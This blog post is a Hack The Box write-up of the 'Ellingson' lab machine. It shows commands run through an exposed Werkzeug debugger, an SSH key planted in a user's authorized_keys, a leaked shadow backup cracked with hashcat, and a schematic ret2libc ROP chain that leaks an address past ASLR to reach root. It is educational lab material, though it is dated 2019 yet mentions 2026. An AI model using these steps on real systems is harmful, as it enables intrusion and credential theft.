---
layout: post
title: "The Most Common Password Is a Confession"
subtitle: "HTB Ellingson, where a debugger left on in production hands you a shell, a forgotten backup leaks the hashes, and a custom binary teaches you to walk through ASLR one leaked address at a time"
date: 2019-10-26 12:00:00 +0000
description: "A production debugger writes your SSH key, a forgotten shadow backup leaks the hashes, and a SUID binary falls to a hand-built ret2libc that leaks its way past ASLR."
image: /assets/og/the-most-common-password-is-a-confession.png
tags: [hackthebox, writeup]
---

Ellingson is the Ellingson Mineral Company, the fictional corporation a teenager robs in a 1995 movie about people in sunglasses typing very fast, and the box wears that skin all the way down. The front door is a website that crashes politely and, instead of an error page, hands you a live Python prompt running on the server. From there you write your own key into a user's account and walk in. Then a backup nobody deleted leaks the password hashes, and the password that cracks is a movie punchline about how everyone picks the same handful of secrets. The last step is the only honest fight on the box, a custom binary that overflows, where you have to leak an address out of the program to find out where its own library lives before you can aim a single shot. Three doors. The first two were left open by accident. The third you actually have to pick.

```
        E L L I N G S O N   M I N E R A L   C O .
        =========================================
        GET /articles/4   →   *the page crashes*
              but the crash is a debugger, and the debugger
              is a python prompt with your name on it.
                       |
                       v
        write your key into hal's account. walk in.
        read a backup that should not exist. crack a
        password that was a joke all along.
                       |
                       v
        then the garbage binary, and a real fight:
        leak where the library lives, then fire once.
                                                  神
```

## 0x01 · the lobby

Two ports answer, which on a hard box is a warning, not a relief. A short attack surface means the holes are deeper.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

The site is a corporate front for a mining company, themed top to bottom on the movie, complete with a security advisory page scolding employees about weak passwords. Read marketing copy on a CTF box the way you would read a ransom note, slowly, because the writers chose every word. That advisory is going to matter later, and the box is telling you so to your face. The articles render from a path like `/articles/1`, and a path that takes a number is a path you should feed a wrong number.

## 0x02 · the crash that talks back

Ask for an article that does not exist, say `/articles/4`, and the application does not show you a clean 404. It throws an unhandled exception, and the exception page is the Werkzeug interactive debugger, left switched on in production.

Here is why that is the entire game. Werkzeug is the engine under a Python web framework, and in development it ships a feature where any error opens a little console in your browser so the developer can poke at the live program and figure out what went wrong. That console runs real Python on the server, with the server's privileges. It is meant for a laptop, behind a locked door, on a machine only the developer can reach. Leaving it on in production is like a bank leaving the manager's override keyboard bolted to the public side of the counter, still logged in, with a sign that says do not touch. Anyone can touch.

So you do not exploit anything. You just type.

```
>>> import os
>>> os.popen('id').read()
'uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)\n'
```

The console answers as `hal`. Reverse shells out of this box get eaten by an outbound firewall, which is fine, because you do not need to call home when you can let yourself in the front. SSH is open. Write your own public key into hal's `authorized_keys` and the box will trust you next time you knock.

```
>>> key = 'ssh-ed25519 AAAA...iceberg'
>>> open('/home/hal/.ssh/authorized_keys','a').write('\n'+key)
```

Then knock.

```
$ ssh -i iceberg_key hal@10.10.10.139
hal@ellingson:~$ id
uid=1001(hal) ... groups=1001(hal),4(adm)
```

Note the second group on that line. `adm`. Hold it.

## 0x03 · the backup that outlived its purpose

`hal` cannot read the real `/etc/shadow`, the file where Linux keeps password hashes, because that file is locked to root. But `hal` is in the `adm` group, and `adm` is the group that gets to read logs and, on this box, the system's backups. So you go looking for anything that group can touch.

```
hal@ellingson:~$ find / -group adm 2>/dev/null
...
/var/backups/shadow.bak
```

There it is. A copy of the shadow file, sitting in the backups folder, readable by your group because somebody set it that way and never thought about it again. Think of `/etc/shadow` as the safe and `shadow.bak` as a photo of everything in the safe that the office left in an unlocked drawer. The safe is still locked. It does not matter, because the photo is just as good.

```
hal@ellingson:~$ cat /var/backups/shadow.bak
root:$6$...:...
theplague:$6$...:...
margo:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYV...:...
hal:$6$...:...
```

Those `$6$` hashes are SHA-512 crypt. They are designed to be slow to guess, so a dictionary attack against all of them with the full `rockyou.txt`, fourteen million guesses each, would take a while. This is where the advisory page pays out. It quoted the movie's line about the four most common passwords, *love, secret, sex, and god*. So you do not guess everything. You guess like the box told you to, filtering the wordlist down to only the candidates that contain those words.

```
hal@ellingson:~$ grep -iE 'love|secret|sex|god' /usr/share/wordlists/rockyou.txt > themed.txt
hal@ellingson:~$ wc -l themed.txt
277308 themed.txt
```

Fourteen million guesses became a quarter million, a list small enough to chew through fast.

```
$ hashcat -m 1800 margo.hash themed.txt
$6$riekpK4m$uBda...:iamgod$08
```

`margo` chose `iamgod$08`. The advisory was not flavor text. It was the answer key. SSH in as margo and take the user flag.

```
$ ssh margo@10.10.10.139
margo@ellingson:~$ cat user.txt
████████████████████████████████
```

## 0x04 · garbage, and the address you have to steal

Now the box stops being generous. Look for special permissions and one binary stands out, owned by root, with the SUID bit set, meaning it runs as root no matter who starts it.

```
margo@ellingson:~$ find / -perm -4000 2>/dev/null
...
/usr/bin/garbage
```

A custom binary named `garbage` is a binary you are meant to break. Run `checksec` on it and you get the lay of the battlefield.

```
$ checksec --file=garbage
Arch:     amd64
NX:       enabled        (the stack cannot run code)
Stack:    No canary      (overflow is undetected)
PIE:      No PIE         (the program's own code sits at a fixed address)
RELRO:    Partial
ASLR:     enabled        (the library is at a random address each run)
```

It asks for a password, and a long enough answer smashes the stack. With no canary, nothing notices. The offset to the return pointer is 136 bytes, found the usual way with a cyclic pattern. So you control where the program goes next. The problem is where to send it.

NX means you cannot drop your own code on the stack and jump to it, the way the ancient overflows worked. The standard answer is ret2libc, reusing code already loaded in the C library, things like the function that spawns a shell. But ASLR scatters that library to a random address every single run, so you do not know where any of it is. This is the real puzzle of the box, and it is worth slowing down for.

Think of it like a phone book that gets reprinted every morning with all the page numbers shuffled. You know the number you want is in there. You just cannot turn to it, because today's page numbers are random. But here is the trick. The program's own code does not move, because PIE is off. And the program already looked up one library function for its own use and wrote that day's page number down on a slip in a known spot, the GOT, the table where a program records where it found each library function. So you do not need to guess the shuffle. You steal one real page number off the slip, and from that one true address you can calculate every other address in that day's printing, because the functions never move relative to each other inside the library.

That is a two-shot exploit. The first overflow leaks; the second one kills.

```
ASLR randomizes the library, not the relationships inside it.

  leaked_puts_address  -  puts_offset_in_libc  =  libc_base
  libc_base  +  shell_offset                   =  where /bin/sh lives today
```

Shot one. Build a tiny ROP chain out of gadgets, little tail-ends of existing instructions. Put the address of the GOT entry for `puts` into the first argument register using a `pop rdi; ret` gadget, then call `puts` itself, which prints that address back to you. Then return to the start of the program so it asks for a password again and you get a second shot.

```
chain 1:  [136 bytes of filler][pop rdi; ret][puts@got][puts@plt][back to main]
   →  the program prints the live address of puts. ASLR just told on itself.
```

With one true address in hand, subtract the known offset of `puts` inside this exact libc to find where the library begins today, then add the offset of a one-shot gadget, a single spot in libc that spawns a shell if the registers are clean. Wrap it with a `setuid(0)` call first so the root SUID privilege is actually kept when the shell starts.

```
chain 2:  [136 bytes][pop rdi; ret][0][setuid][one-shot /bin/sh gadget]
```

Fire it.

```
margo@ellingson:~$ python3 exploit.py
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

That is the box. The library moved, and you made the program point at it for you.

## 0x05 · the honest caveat

It is easy to file each step under its own small mistake. A debug flag left on, a backup with a loose group, a password from a movie, one sloppy binary. But there is a single thread running through all four, and it is the thing actually worth carrying out of here. Every one of those was somebody trusting that nobody would look in the obvious place.

The debugger was on because it was on in development and nobody flipped it off for production, trusting that the error page would never appear to a stranger. The backup was group-readable because that was convenient and nobody pictured an attacker already standing inside the `adm` group. The password was a joke the company itself made public on its own advisory page, then used anyway. None of those needed a zero-day. They needed someone to type a wrong article number, run one `find`, and read the marketing copy literally.

The overflow is the one with real teeth, and it is also the most honest. ASLR is genuine, modern protection, and it works. It did not fail here. It got defeated by a program that leaked its own address, which is the quiet lesson of every memory-corruption fight in 2026. Randomization buys you nothing if the same program hands an attacker one true pointer, because one true pointer unwinds the whole shuffle. The defense was never the random addresses. The defense was never letting a single real one escape. Patch the binary, sure, but the binary was only the messenger. The message is that a secret address is a secret only until the program says it out loud once.

## 0x06 · outro

```
the page crashed and the crash had a prompt.
the safe was locked but the photo was in a drawer.
the password was printed on the wall the whole time.

then the library hid, and the program pointed right at it.
ASLR did its job. the binary undid it in one breath.

flip the debug flag. mind the backup. wear black.

                                                            EOF
```

---

*HTB: Ellingson, retired 19 Oct 2019. A hard Linux box that is really a movie quote about the four most common passwords, bolted to a ret2libc you have to earn by leaking ASLR one address at a time. The garbage still overflows in a lab and nowhere you don't own.*